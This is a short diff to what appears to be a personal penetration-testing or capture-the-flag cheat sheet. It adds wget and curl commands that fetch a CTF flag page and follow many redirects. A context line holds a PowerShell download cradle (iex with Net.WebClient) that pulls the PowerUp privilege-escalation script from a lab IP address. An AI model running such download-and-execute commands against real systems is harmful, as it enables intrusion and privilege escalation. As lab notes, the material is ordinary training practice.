@@ -51,3 +51,7 @@ iex (New-Object Net.WebClient).DownloadFile('http://10.10.14.114:3333/PowerUp.ps
 dir /s *foo*
 Searching on windows cli
 ---------------------------------------
+
+wget http://jh2i.com:50011/site/flag.php --max-redirect 120
+curl -L --max-redirs
+---------------------------------------
